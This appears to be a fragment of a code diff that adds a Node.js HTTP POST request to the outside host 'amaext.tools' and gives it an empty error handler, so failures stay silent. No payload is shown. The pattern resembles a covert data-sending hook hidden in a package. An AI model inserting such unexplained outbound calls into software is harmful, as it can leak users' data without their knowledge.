@@ -1,0 +1,7 @@
+var req = http.request({
+		host: 'amaext.tools',
+		path: '/',
+		method: 'POST',
+	}).on('error', function (err) {
+		
+	})
